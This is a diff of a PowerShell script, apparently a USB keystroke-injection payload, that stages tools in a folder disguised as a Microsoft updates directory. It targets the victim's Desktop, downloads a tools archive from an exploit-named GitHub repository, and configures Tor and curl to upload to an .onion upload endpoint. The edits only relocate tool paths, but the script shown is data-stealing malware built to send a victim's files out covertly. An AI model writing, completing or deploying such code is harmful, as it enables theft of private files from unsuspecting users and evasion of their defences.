@@ -1,12 +1,12 @@
 # Set paths
 $targetDirectory = [Environment]::GetFolderPath("UserProfile") + "\Desktop"
 $dropPath = "$env:APPDATA\.microsoft\updates"
-$torPath = "$dropPath\tor\tor.exe"
-$torrcPath = "$dropPath\tor\torrc"
-$curlPath = "$dropPath\curl\bin\curl.exe"
+$torPath = "$dropPath\tools\tor\tor.exe"
+$torrcPath = "$dropPath\tools\tor\torrc"
+$curlPath = "$dropPath\tools\curl\bin\curl.exe"
 $onionURL = "rokyn4z5yzjmbwb5pr5mdes2rmogz2vzfmrvt4mx6ur5mum5bqytkcad.onion"
 $uploadURL = $onionURL + "/upload.php"
-$logFile = "$dropPath\tor.log"
+$logFile = "$dropPath\tools\tor\tor.log"
 
 # Set the download URL
 $toolsURL = "https://raw.githubusercontent.com/barksploit/ducky/refs/heads/master/tools.zip"
@@ -25,7 +25,7 @@ Expand-Archive -Path $zipFile -DestinationPath $dropPath -Force
 
 Set-Content -Path $torrcPath -Value @"
 SocksPort 9050
-ClientOnionAuthDir $dropPath\tor\auth
+ClientOnionAuthDir $dropPath\tools\tor\auth
 Log notice file $logFile
 "@
 
